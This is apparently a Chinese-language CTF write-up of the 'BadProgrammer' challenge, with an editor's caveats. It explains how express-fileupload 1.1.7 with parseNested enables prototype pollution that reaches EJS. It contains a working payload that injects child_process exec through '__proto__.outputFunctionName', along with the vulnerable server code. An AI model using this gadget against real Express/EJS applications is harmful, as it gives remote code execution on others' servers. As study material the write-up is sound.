ailx10说：这篇是我2024年12月写的。BadProgrammer 的线索先藏在 static 路径的源码里。我翻到依赖，看到 express-fileupload 的版本和 parseNested 配置，再把 multipart 里的嵌套属性与 EJS 后面的行为接起来，尝试了两种验证结果。这篇保留的是一条从依赖信息走到具体触发条件的链。它让我更愿意在审计时看看配置，而不只盯业务函数：同一个库名、不同版本或一个开关，都可能让后面的对象结构完全不同。题目里能走通的路，也得把这些条件一起写出来才完整。

---

编辑核查提示：原记录涉及 express-fileupload 中的原型污染和 EJS 中可能触发执行的属性；二者为不同环节，实际影响依赖组件版本、配置和调用路径。 本稿保留历史题目截图及代码，未在原题环境重新运行；截图内容和水印、引用链接仍需发布前复核。

本文分析 express-fileupload 的原型污染与模板引擎处理属性之间的历史案例。是否造成代码执行取决于可控属性如何进入后续 EJS 调用、组件版本及配置，不能把所有原型污染等同于执行代码。

```
{
    "__proto__.outputFunctionName": (
        None,
        f"x;process.mainModule.require('child_process').exec('{exec_command}');x"
    )
}
```

题目代码启用 parseNested，原文记录依赖版本为 1.1.7。GitHub 安全公告列出受影响版本小于 1.1.9，修复版本为 1.1.9；公告描述和版本范围在历史资料中存在差异，应以所用版本的补丁及供应商公告核对。

![](/notes-assets/c7ae2ebcf9d4c91dad28.webp)

```
const express = require('express');
const fileUpload = require('express-fileupload');
const app = express();

app.use(fileUpload({ parseNested: true }));

app.post('/4_pATh_y0u_CaNN07_Gu3ss', (req, res) => {
    res.render('flag.ejs');
});

app.get('/', (req, res) => {
    res.render('index.ejs');
})

app.listen(3000);
app.on('listening', function() {
    console.log('Express server started on port %s at %s', server.address().port, server.address().address);
});
```
